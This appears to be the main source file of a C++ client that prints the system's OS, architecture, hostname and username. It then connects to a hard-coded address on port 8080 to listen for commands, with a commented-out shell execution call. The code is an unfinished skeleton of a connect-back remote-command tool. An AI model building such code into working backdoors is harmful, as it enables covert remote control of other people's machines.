#include <iostream>
#include <filesystem>

#include "src/Directory.h"
#include "src/network/Client.h"
#include "src/network/OSInformation.h"

#if defined(_WIN32)
#include <windows.h>
#include "src/windows/command_output.h"

#elif defined(__APPLE__)
#include "src/apple/command_output.h"

#endif

int main() {

    // Sending OS information
    std::string path;

    path = std::filesystem::current_path();

    Directory directory = Directory(path.c_str());

    std::cout << OSInformation::name() << std::endl;
    std::cout << OSInformation::architecture() << std::endl;
    std::cout << OSInformation::hostname() << std::endl;
    std::cout << OSInformation::username() << std::endl;

    Client client = Client();

    std::string host = "192.168.0.19", port = "8080";

    client.Connect(host, port);
    client.Listen();

    std::string command;
    while (client.isConnected()) {
        if (!command.empty()) {
            std::cout << command << std::endl;
        }
    }

    //std::string result = execute("ls");
    //std::cout << result << std::endl;
}